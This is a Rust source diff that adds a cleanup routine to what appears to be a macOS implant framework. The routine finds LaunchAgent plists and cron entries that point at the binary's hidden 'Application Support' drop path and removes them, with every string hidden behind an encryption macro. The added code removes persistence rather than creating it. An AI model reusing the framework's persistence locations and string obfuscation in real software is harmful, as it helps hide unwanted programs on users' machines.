@@ -241,6 +241,119 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
     }
 }
 
+// ── Full cleanup (persist:cleanup / sys:die) ──────────────────────────
+//
+// Removes every persistence artifact this install may have created,
+// keyed by the stable-drop location (~/Library/Application Support/<name>)
+// rather than operator-chosen label names: any LaunchAgent plist whose
+// ProgramArguments point at the stable path or the current exe is ours.
+// (No macOS shell-profile persistence exists in this framework, so there
+// is nothing to clean for that method.)
+
+/// Stable-drop path for the currently running binary, computed exactly
+/// the way stable_drop() does - but without copying anything.
+pub fn stable_path_for_current_exe() -> Option<String> {
+    let exe = std::env::current_exe().ok()?;
+    let name = exe.file_name()?.to_string_lossy().into_owned();
+    let dir = home_dir().ok()?
+        .join(aes_str!("Library"))
+        .join(aes_str!("Application Support"))
+        .join(&name);
+    Some(dir.join(&name).to_string_lossy().into_owned())
+}
+
+/// Map a remove_* result onto a per-method status line.
+fn classify(method: &str, r: Result<String, String>) -> String {
+    match r {
+        Ok(m) if m.contains(aes_str!("[~]").as_str()) => format!("{}: not-present", method),
+        Ok(m) => format!("{}: removed ({})", method, m),
+        Err(e) => format!("{}: failed ({})", method, e),
+    }
+}
+
+pub fn cleanup_all() -> String {
+    let exe = std::env::current_exe()
+        .map(|p| p.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let stable = stable_path_for_current_exe().unwrap_or_default();
+
+    let mut report = vec![format!(
+        "{} (exe: {}, stable: {})",
+        aes_str!("[*] Persistence cleanup"), exe, stable
+    )];
+
+    // ── LaunchAgent: scan ~/Library/LaunchAgents for plists referencing
+    // our stable path or the current exe (catches arbitrary labels).
+    let mut candidates: Vec<String> = Vec::new();
+    if let Ok(dir) = launch_agents_dir() {
+        if let Ok(entries) = fs::read_dir(&dir) {
+            for e in entries.flatten() {
+                let p = e.path();
+                if !p.extension().map(|x| x == aes_str!("plist").as_str()).unwrap_or(false) {
+                    continue;
+                }
+                if let Ok(content) = fs::read_to_string(&p) {
+                    let ours = (!stable.is_empty() && content.contains(&stable))
+                        || (!exe.is_empty() && content.contains(&exe));
+                    if ours {
+                        if let Some(stem) = p.file_stem() {
+                            let label = stem.to_string_lossy().into_owned();
+                            if !candidates.contains(&label) {
+                                candidates.push(label);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    if candidates.is_empty() {
+        report.push(format!("{}: not-present", aes_str!("launchagent")));
+    } else {
+        let mut removed = Vec::new();
+        let mut errors = Vec::new();
+        for label in &candidates {
+            match remove_launchagent(label) {
+                Ok(_) => removed.push(label.clone()),
+                Err(e) => errors.push(format!("{label}: {e}")),
+            }
+        }
+        if !removed.is_empty() {
+            report.push(format!("{}: removed ({})", aes_str!("launchagent"), removed.join(", ")));
+        } else {
+            report.push(format!("{}: failed ({})", aes_str!("launchagent"), errors.join("; ")));
+        }
+    }
+
+    // ── cron: entries referencing the stable path or the raw exe path.
+    let mut cron_removed = false;
+    let mut cron_err: Option<String> = None;
+    let mut paths: Vec<&String> = Vec::new();
+    for p in [&stable, &exe] {
+        if !p.is_empty() && !paths.contains(&p) {
+            paths.push(p);
+        }
+    }
+    for path in paths {
+        match remove_cron(path) {
+            Ok(m) if m.contains(aes_str!("[+]").as_str()) => cron_removed = true,
+            Ok(_) => {}
+            Err(e) => cron_err = Some(e),
+        }
+    }
+    if cron_removed {
+        report.push(format!("{}: removed", aes_str!("cron")));
+    } else if let Some(e) = cron_err {
+        report.push(format!("{}: failed ({})", aes_str!("cron"), e));
+    } else {
+        report.push(format!("{}: not-present", aes_str!("cron")));
+    }
+
+    report.push(aes_str!("[+] Cleanup complete"));
+    report.join("\n")
+}
+
 // ── Inventory ─────────────────────────────────────────────────────────
 
 pub fn list() -> String {
